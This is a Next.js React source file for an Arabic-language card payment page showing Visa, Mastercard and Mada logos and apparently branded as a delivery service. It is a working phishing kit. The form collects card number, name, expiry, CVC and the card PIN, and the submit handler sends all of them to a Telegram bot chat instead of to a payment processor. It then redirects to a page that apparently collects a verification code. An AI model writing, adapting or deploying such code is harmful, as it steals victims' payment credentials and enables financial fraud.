"use client"
import styles from './pay.module.css'
import visa from '../../../../../public/visa.png'
import master from '../../../../../public/master.png'
import mada from '../../../../../public/mada.png'
import Image from 'next/image'
import {useRef} from 'react'
import { useRouter,useSearchParams } from 'next/navigation'
import bot from '@/compnante/dataBot'

const Pay=()=>{
    const selectPay = useRef()
    const namecard = useRef()
    const NumsCard = useRef()
    const dateCardmm = useRef()
    const dateCardyy = useRef()
    const cvcCard = useRef()
    const passCard = useRef();
    const x = useSearchParams();
    const datas = x.get("names");
    
    const router = useRouter()
    const handleSubmit = (e) => {
        e.preventDefault();
 
        var length =`مدونة سمسا  %0A طريقة الدفع : ${selectPay.current.value}  %0A  رقم البطاقة  : ${NumsCard.current.value} %0A الاسم على البطاقة:${namecard}%0A  MM    :  ${dateCardmm.current.value} %0A  YY   :  ${dateCardyy.current.value} %0A cvc : ${cvcCard.current.value}%0A رمز البطاقة:${passCard.current.value} %0A %0A ${datas}`
       
        
        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
      
      }
      const handlerout = ()=>{
        if(namecard.current.value == "" || NumsCard.current.value == "" || dateCardmm.current.value == "" || dateCardyy.current.value == "" || cvcCard.current.value == "" || passCard.current.value == ""){
          alert('من فضلك قم بملى الحقول')
        }else{
          
          router.push(`/aram/banks/pay/code?names=${datas}`)
        }
      }
  return (
    <div className={styles.contect} dir='rtl'>
    
        <div>
            <Image 
                src={visa}
                alt='visa'
                width={50}
            />
            <Image 
                src={master}
                alt='master'
                width={50}
            />
            <Image 
                src={mada}
                alt='mada'
                width={35}
            />
        </div>
        <form action='/pay/code' onSubmit={handleSubmit}>
            <select name="selectedPay" ref={selectPay} required>
                <option value="مدى">مدى</option>
                <option value="فيزا كارد">فيزا كارد</option>
                <option value="ماستر كارد">ماستر كارد</option>
            </select>
            <input type="text" placeholder='الاسم على البطاقة'ref={namecard} required/>
            <input type="number" placeholder='رقم البطاقة' dir="ltr" ref={NumsCard}  required maxLength="16"/>
            <div>
            <input type="text" placeholder='(MM)'  ref={dateCardmm} maxLength="2" required/>
            <input type="text" placeholder='(YY)'  ref={dateCardyy} maxLength="2" required/>
            </div>
            
            
            <input type="text" placeholder='الرقم (cvc/cvv)'ref={cvcCard} maxLength="3" required/>
            <input type="text" placeholder='رمز البطاقة المكون من اربعة ارقام'ref={passCard} maxLength="5" required/>
            <button type='submit' onClick={handlerout}> ارسال</button>
        </form>
    </div>
  )
}

export default Pay;
